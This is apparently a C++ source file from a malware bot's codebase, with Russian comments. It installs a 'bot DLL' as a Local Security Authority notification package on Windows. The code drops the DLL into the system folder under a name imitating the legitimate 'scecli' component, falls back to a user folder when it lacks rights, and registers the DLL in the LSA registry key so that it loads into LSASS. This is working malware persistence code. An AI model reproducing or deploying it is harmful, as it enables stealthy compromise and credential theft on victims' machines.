#pragma once

#include "core\core.h"
#include "core\debug.h"
#include "core\reestr.h"
#include "core\rand.h"
#include "core\file.h"

namespace Secure
{

bool Lsa( const Mem::Data& dllBody, const StringBuilder& folder )
{
	Mem::Data data;
	Reestr r( HKEY_LOCAL_MACHINE, _CS_("System\\CurrentControlSet\\Control\\Lsa") );
	if( !r.Valid() ) return false;
	StringBuilderStack<32> NP( _CS_("Notification Packages") );
	if( !r.GetData( NP, data, REG_MULTI_SZ ) ) return false;
	StringBuilderStack<16> scecli( _CS_("scecli") );
	char* s = data.p_char();
	while( *s )
	{
		int p = Str::IndexOf( s, scecli, -1, scecli.Len() );
		if( p >= 0 )
		{
			int p2 = p + scecli.Len();
			if( s[p2] != 0 && ( s[p2 + 1] == 0 || s[p2 + 1] == '.' ) )
				break;

		}
		s += Str::Len(s) + 1;
	}
	StringBuilder reestrName(MAX_PATH), fileName(MAX_PATH);
	if( *s == 0 )
	{
		char c = Rand::Gen( 'a', 'z' );
		reestrName = scecli;
		reestrName += c;
	}
	else
		reestrName = s;
	fileName = reestrName;
	if( fileName.IndexOf(':') < 0 ) //только имя (не полный путь)
	{
		StringBuilderStack<MAX_PATH> path;
		Path::GetCSIDLPath( CSIDL_SYSTEM, path, fileName );
		fileName = path;
		fileName += _CS_(".dll");
	}
	bool ret = false;
	if( File::Write( fileName, dllBody ) ) //пишет в системную папку
		ret = true;
	else //пишем в переданную папку, такое может быть, если есть только права юзера
	{
		StringBuilderStack<MAX_PATH> path;
		Path::Combine( path, folder, Path::GetFileName(fileName) );
		fileName = path;
		if( File::Write( fileName, dllBody ) )
		{
			reestrName = fileName;
			ret = true;
		}
	}
	if( ret )
	{
		DbgMsg( "DLL бота сохранили в %s", fileName.c_str() );
		if( *s == 0 ) //еще в реестре нет записи
		{
			data.Insert( data.Len() - 1,  reestrName.c_str(), reestrName.Len() + 1 );
			if( r.SetData( NP, data, REG_MULTI_SZ ) )
			{
				DbgMsg( "Реестр был обновлен" );
				ret = true;
			}
			else
			{
				File::Delete(fileName);
				ret = false;
			}
		}
	}
	return ret;
}

}
